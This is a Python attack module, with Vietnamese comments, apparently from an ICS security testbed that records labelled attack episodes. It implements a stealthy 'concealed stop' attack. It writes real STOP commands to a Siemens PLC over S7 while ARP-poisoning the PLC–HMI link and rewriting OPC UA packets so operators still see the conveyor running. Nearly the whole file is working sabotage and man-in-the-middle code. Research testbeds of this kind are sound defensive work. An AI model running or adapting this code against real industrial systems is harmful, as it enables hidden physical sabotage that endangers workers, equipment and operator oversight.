"""
CONCEALED_STOP_ATTACK
Ket hop 2 ky thuat da co san trong repo thanh 1 kich ban "stealthy concealment
attack" dung nghia theo Urbina et al., "Limiting the Impact of Stealthy
Attacks on Industrial Control Systems" (ACM CCS 2016): tan cong actuator that
+ DONG THOI gia mao sensor feedback de che giau hieu ung khoi operator/IDS --
khac voi tan cong actuator don le (khong che giau) hay spoof sensor don le
(khong kem actuator that).

Khac voi 2 module nguon:
  - attacks_ext/logic_aware.py: chi tan cong actuator (STOP that), KHONG che
    giau -- WinCC/HMI thay dung trang thai dung that (T0831 Manipulate
    Control, khong kem T0832).
  - tests/test_mitm_opcua_spoof.py: chi lat 1 Boolean MU lien tuc trong toan
    bo thoi gian chay, khong dieu kien theo 1 actuator attack cu the -- muc
    dich la do dac "co sua duoc khong", khong phai che giau co chu dich.

Co che cua module nay:
  1. Luong S7 (snap7): doc CD1 tren PLC nhu logic_aware.py, chi hanh dong khi
     phat hien dung luc "vat dang van chuyen". Khi kich hoat: BAT concealment
     TRUOC, roi moi ghi STOP=True/START=False that len PLC -- dam bao khong
     co khung hinh "stopped that" nao lot ra HMI truoc khi concealment kip
     bat.
  2. Luong MITM (scapy, tai su dung dinh vi ClientHandle=204 cua BangTai da
     xac dinh trong tests/test_mitm_opcua_spoof.py): CHI khi concealment
     dang bat, ep gia tri BangTai gui ve HMI thanh True (RUNNING) bat ke gia
     tri that la gi. Ngoai cua so do, forward nguyen goc -- khac voi flip mu
     lien tuc, day la "inject vua du sai so dung luc can" giong ngu nghia
     Urbina, khong phai gay nhieu ca luc khong tan cong.
  3. Khi ket thuc cua so STOP (restart that), tat concealment de HMI dong bo
     lai voi trang thai that.

LICH SU DEBUG (giu lai de khong lap lai sai lam): ban dau nghi ngo gateway.py
(web_scada/backend/app/opcua/gateway.py) co 2 duong cap nhat doc lap --
Subscription/PublishResponse (co ClientHandle, che duoc qua
conceal_bangtai_running) VA mot poll loop rieng moi ~1s qua ReadRequest/
ReadResponse (_poll_loop/_read_tag_once, KHONG co ClientHandle) -- nen da
them conceal_bangtai_read_response()/is_bangtai_read_request() de che ca 2
duong. Gia thuyet do VAN DUNG VE MAT LY THUYET (poll loop la duong leak that
neu chi che duong Publish), nhung khong phai nguyen nhan cua lan fail da do
duoc: label CSV cho thay intercepted=0 O CA 3 LAN CHAY -- tuc la KHONG co goi
OPC UA nao lot vao MITM ca, nen ca 2 co che che gia tri deu chua bao gio duoc
thuc thi tren du lieu that. Nguyen nhan that: get_if_hwaddr(iface) tren Npcap/
Windows tra ve MAC rong (00:00:00:00:00:00), va arp_poison() truoc day khong
set hwsrc tuong minh nen scapy dien MAC rong do vao goi ARP -- nan nhan nhan
duoc poison "IP nay o MAC rong", vo nghia, KHONG redirect duoc traffic. Da vá
bang resolve_attacker_mac() (copy tu tests/test_mitm_opcua_spoof.py, da tung
giai quyet dung bug nay o file do) + truyen attacker_mac tuong minh vao
arp_poison(). conceal_bangtai_read_response() van giu lai vi van co gia tri
phong ngua that (mot khi ARP da redirect duoc, poll loop leak van la nguy co
that su), nhung dung coi day la thu da "kiem chung thuc te" -- chua co lan
chay nao voi ARP hoat dong dung de kiem chung dieu do.

GIOI HAN THAT (khong phong dai, quan trong khi viet bao cao): day la
concealment o TANG MANG (ARP poison + sua goi tin OPC UA giua PLC va HMI),
KHONG PHAI code injection vao chinh PLC nhu Stuxnet that (MITRE T0835
Manipulate I/O Image ban goc, noi PLC tu che giau ngay tai firmware). Hieu
ung quan sat duoc tu phia HMI la tuong tu (operator thay "binh thuong" trong
luc qua trinh that da bi can thiep), nhung co che ky thuat khac hoan toan --
dung nham lan 2 khai niem nay khi trich dan trong bao cao.

Yeu cau: pip install scapy, chay Admin (Windows) / sudo (Linux), IP
forwarding TAT (script tu forward 1 chieu HMI->PLC, sua rieng PLC->HMI).

Goi tu bash:
  python -m attacks_ext.concealed_stop_attack \
      --target 192.168.210.211 --rack 0 --slot 1 \
      --hmi-ip 192.168.210.31 --iface "\\Device\\NPF_{GUID}" \
      --duration 120 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import threading
import time
from attacks_ext.config_ext import base_parser, write_label

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool, get_dint

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, Raw,
        sendp, srp, sniff, getmacbyip,
    )
except ImportError:
    print("[!] Thieu scapy: pip install scapy")
    raise SystemExit(1)

OPCUA_PORT = 4840
UA_MSG_TYPES = {b"HEL", b"OPN", b"MSG", b"CLO", b"ERR"}

# Xem docstring module tests/test_mitm_opcua_spoof.py de biet cach suy ra
# 204 (thu tu tag bang_tai trong config/opcua_tags.yaml + cach asyncua
# Subscription cap ClientHandle bat dau tu 200, +1 moi lan subscribe).
BANGTAI_CLIENT_HANDLE = 204
_HANDLE_BYTES = BANGTAI_CLIENT_HANDLE.to_bytes(4, "little")

concealment_active = threading.Event()
stop_all = threading.Event()
intercepted_count = 0
concealed_count = 0

# Correlation flag for the poll-loop leak fix (see module docstring). Only
# ever touched from inside the single sniff() callback thread, so a plain
# bool is safe -- packets are processed strictly in arrival order.
_bangtai_read_pending = False
BANGTAI_NODEID_MARKER = b"BangTai"


def decode_ua_header(raw: bytes):
    if len(raw) < 8:
        return None
    msg_type = raw[0:3]
    if msg_type not in UA_MSG_TYPES:
        return None
    return {"type": msg_type.decode()}


def find_bangtai_value_offset(body: bytes):
    """Same ClientHandle-anchored lookup as test_mitm_opcua_spoof.py --
    see that module's docstring for why 204 identifies BangTai specifically."""
    start = 0
    while True:
        idx = body.find(_HANDLE_BYTES, start)
        if idx == -1:
            return None
        value_offset = idx + 4
        if value_offset + 1 >= len(body):
            start = idx + 1
            continue
        encoding_mask = body[value_offset]
        variant_type = body[value_offset + 1]
        if (encoding_mask & 0x01) and variant_type == 0x01:  # Value present, Boolean scalar
            return value_offset + 2
        start = idx + 1


def conceal_bangtai_running(payload: bytes) -> bytes:
    """Force BangTai's transmitted value to True (RUNNING) while concealment
    is active; forward the frame untouched otherwise. This is the module's
    core difference from a blind flip: it only lies exactly when the S7
    thread has just forced a real STOP, and only in the direction that hides
    that specific stop."""
    global concealed_count
    payload = bytearray(payload)
    header = decode_ua_header(bytes(payload))
    if not header or header["type"] != "MSG":
        return bytes(payload)
    body = payload[8:]
    offset = find_bangtai_value_offset(bytes(body))
    if offset is None:
        return bytes(payload)
    if concealment_active.is_set() and body[offset] != 0x01:
        body[offset] = 0x01
        concealed_count += 1
    payload[8:] = body
    return bytes(payload)


def is_bangtai_read_request(raw: bytes) -> bool:
    """HMI->PLC ReadRequest naming BangTai's NodeId. gateway.py's poll loop
    issues one ReadRequest per tag (not batched), so seeing this string in a
    request is enough to know the next PLC->HMI ReadResponse on this session
    is BangTai's single result -- no need to parse the NodesToRead array."""
    header = decode_ua_header(raw)
    if not header or header["type"] != "MSG":
        return False
    return BANGTAI_NODEID_MARKER in raw


def find_first_boolean_dv(body: bytes):
    """Blind EncodingMask+Boolean-Variant scan -- unsafe in a multi-item
    Publish frame (see tests/test_mitm_opcua_spoof.py's docstring on why that
    was replaced by ClientHandle targeting), but safe here because the frame
    was already correlated to a single-node BangTai ReadRequest, so there is
    only one DataValue to find. Requires the EncodingMask (Value-present bit
    set) AND the following Variant TypeId==Boolean(1) as two separate bytes
    before returning the value at i+2 -- checking only "byte 0x01 followed by
    0/1" (as a naive scan would) misfires here: EncodingMask=0x01 immediately
    followed by TypeId=0x01 looks like its own match and points one byte too
    early, landing on the TypeId byte instead of the value."""
    for i in range(len(body) - 2):
        encoding_mask = body[i]
        variant_type = body[i + 1]
        if (encoding_mask & 0x01) and variant_type == 0x01:
            return i + 2
    return None


def conceal_bangtai_read_response(payload: bytes) -> bytes:
    """Force the sole DataValue of a correlated BangTai ReadResponse to True
    while concealment is active. Complements conceal_bangtai_running(), which
    only covers the Publish/subscription path -- see module docstring."""
    global concealed_count
    payload = bytearray(payload)
    header = decode_ua_header(bytes(payload))
    if not header or header["type"] != "MSG":
        return bytes(payload)
    body = payload[8:]
    offset = find_first_boolean_dv(bytes(body))
    if offset is None:
        return bytes(payload)
    if concealment_active.is_set() and body[offset] != 0x01:
        body[offset] = 0x01
        concealed_count += 1
    payload[8:] = body
    return bytes(payload)


def _is_null_mac(mac):
    return (not mac) or mac.lower() in ("00:00:00:00:00:00", "")


def resolve_attacker_mac(iface, plc_ip):
    """get_if_hwaddr(iface) tren Npcap/Windows hay tra ve MAC rong (bug da
    biet -- xem tests/test_mitm_opcua_spoof.py). Neu khong bat duoc dieu nay,
    ARP poison gui hwsrc rong (scapy tu dien khi khong set hwsrc, cung dua
    tren cung co che phat hien loi nay) -- nan nhan khong the gui traffic ve
    dung may attacker, redirect luon la 0 goi. Thu nhieu cach, tra MAC hop le
    dau tien."""
    try:
        mac = get_if_hwaddr(iface)
        if not _is_null_mac(mac):
            return mac, "get_if_hwaddr"
    except Exception:
        pass
    try:
        from scapy.all import conf
        _, attacker_ip, _ = conf.route.route(plc_ip)
        from scapy.arch.windows import get_windows_if_list
        for i in get_windows_if_list():
            if attacker_ip in (i.get("ips") or []) and not _is_null_mac(i.get("mac")):
                return i["mac"], f"windows_if_list(ip={attacker_ip})"
    except Exception:
        pass
    try:
        from scapy.all import conf
        mac = getattr(conf.iface, "mac", None)
        if not _is_null_mac(mac):
            return mac, "conf.iface.mac"
    except Exception:
        pass
    return None, "FAILED"


def get_mac(ip, timeout=2):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except Exception:
        return None


def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac):
    poison_to_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=attacker_mac)
    poison_to_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=attacker_mac)
    while not stop_all.is_set():
        sendp(poison_to_hmi, iface=iface, verbose=False)
        sendp(poison_to_plc, iface=iface, verbose=False)
        time.sleep(1.5)


def restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    fix_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=plc_mac)
    fix_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=hmi_mac)
    for _ in range(5):
        sendp(fix_hmi, iface=iface, verbose=False)
        sendp(fix_plc, iface=iface, verbose=False)
        time.sleep(0.3)


def mitm_packet_callback(pkt, plc_ip, hmi_ip, iface):
    global intercepted_count, _bangtai_read_pending
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return
    src_ip, dst_ip = pkt[IP].src, pkt[IP].dst
    sport, dport = pkt[TCP].sport, pkt[TCP].dport
    if sport != OPCUA_PORT and dport != OPCUA_PORT:
        return
    intercepted_count += 1

    if src_ip == plc_ip and dst_ip == hmi_ip and sport == OPCUA_PORT and pkt.haslayer(Raw):
        raw = bytes(pkt[Raw].load)
        if _bangtai_read_pending:
            modified = conceal_bangtai_read_response(raw)
            _bangtai_read_pending = False
        else:
            modified = conceal_bangtai_running(raw)
        new_pkt = pkt.copy()
        new_pkt[Raw].load = modified
        del new_pkt[IP].chksum
        del new_pkt[TCP].chksum
        hmi_mac = getmacbyip(hmi_ip)
        if hmi_mac:
            sendp(Ether(dst=hmi_mac) / new_pkt[IP], iface=iface, verbose=False)
        return

    if src_ip == hmi_ip and dst_ip == plc_ip:
        if pkt.haslayer(Raw) and is_bangtai_read_request(bytes(pkt[Raw].load)):
            _bangtai_read_pending = True
        plc_mac = getmacbyip(plc_ip)
        if plc_mac:
            sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)


def mitm_thread_main(plc_ip, hmi_ip, iface, plc_mac, hmi_mac, attacker_mac):
    arp_t = threading.Thread(
        target=arp_poison,
        args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac),
        daemon=True,
    )
    arp_t.start()
    time.sleep(2)
    try:
        sniff(
            filter=f"tcp port {OPCUA_PORT}",
            prn=lambda pkt: mitm_packet_callback(pkt, plc_ip, hmi_ip, iface),
            stop_filter=lambda pkt: stop_all.is_set(),
            store=False,
            iface=iface,
        )
    finally:
        restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface)


def read_cd1(client):
    return get_dint(client.read_area(Areas.MK, 0, 54, 4), 0)


def run(args):
    label_prefix = "CONCEALED_STOP_ATTACK"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target} hmi={args.hmi_ip}")

    plc_mac = get_mac(args.target)
    hmi_mac = get_mac(args.hmi_ip)
    if not plc_mac or not hmi_mac:
        print(f"[ERR] Khong resolve duoc MAC (plc={plc_mac} hmi={hmi_mac}) -- huy")
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note="mac_resolve_failed")
        return

    attacker_mac, mac_method = resolve_attacker_mac(args.iface, args.target)
    print(f"[*] Attacker MAC = {attacker_mac}  (resolve qua: {mac_method})")
    if _is_null_mac(attacker_mac):
        print("[ERR] Khong resolve duoc attacker MAC hop le -- ARP poison se vo tac dung, huy.")
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note="attacker_mac_resolve_failed")
        return

    mitm_t = threading.Thread(
        target=mitm_thread_main,
        args=(args.target, args.hmi_ip, args.iface, plc_mac, hmi_mac, attacker_mac),
        daemon=True,
    )
    mitm_t.start()
    print(f"[+] MITM concealment channel started (PLC {args.target} <-> HMI {args.hmi_ip})")

    client = snap7.client.Client()
    stop_count = 0
    original = None

    try:
        client.connect(args.target, args.rack, args.slot)
        print("[+] S7 foothold connected -- monitoring CD1 for transport window...")
        m5_orig = client.read_area(Areas.MK, 0, 5, 1)
        original = {"START": get_bool(m5_orig, 0, 0), "STOP": get_bool(m5_orig, 0, 1)}

        end_time = time.time() + args.duration
        while time.time() < end_time:
            m5 = client.read_area(Areas.MK, 0, 5, 1)
            is_stop = get_bool(m5, 0, 1)
            cd1 = read_cd1(client)

            if cd1 > 0 and cd1 < 30000 and not is_stop:
                concealment_active.set()
                time.sleep(0.3)  # de it nhat 1 PublishResponse ke tiep bi che truoc khi STOP that

                m5 = client.read_area(Areas.MK, 0, 5, 1)
                set_bool(m5, 0, 1, True)
                set_bool(m5, 0, 0, False)
                client.write_area(Areas.MK, 0, 5, m5)
                stop_count += 1
                print(f"  [{stop_count}] STOP that (CD1={cd1}ms) + concealment ON "
                      f"(HMI van thay BangTai=RUNNING)")

                time.sleep(6)

                m5 = client.read_area(Areas.MK, 0, 5, 1)
                set_bool(m5, 0, 1, False)
                set_bool(m5, 0, 0, True)
                client.write_area(Areas.MK, 0, 5, m5)
                time.sleep(1)
                concealment_active.clear()
                print(f"  [{stop_count}] Restart that -- concealment OFF (HMI dong bo lai trang thai that)")

            time.sleep(2)

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        concealment_active.clear()
        if original is not None and client.get_connected():
            try:
                m5 = client.read_area(Areas.MK, 0, 5, 1)
                set_bool(m5, 0, 0, original["START"])
                set_bool(m5, 0, 1, original["STOP"])
                client.write_area(Areas.MK, 0, 5, m5)
                print(f"[*] Restored START={original['START']} STOP={original['STOP']}")
            except Exception as e:
                print(f"[ERR] Restore that bai, can khoi phuc thu cong: {e}")
        if client.get_connected():
            client.disconnect()
        stop_all.set()
        mitm_t.join(timeout=10)
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"stops={stop_count} intercepted={intercepted_count} concealed_pkts={concealed_count}")


def main():
    p = base_parser("Concealed Stop Attack (S7 actuator STOP + OPC UA sensor concealment, Urbina et al. CCS16 style)")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    p.add_argument("--hmi-ip", default="192.168.210.31")
    p.add_argument("--iface", required=True,
                   help="Npcap interface for ARP poison + capture (khop CAPTURE_IFACE trong testbed.conf)")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
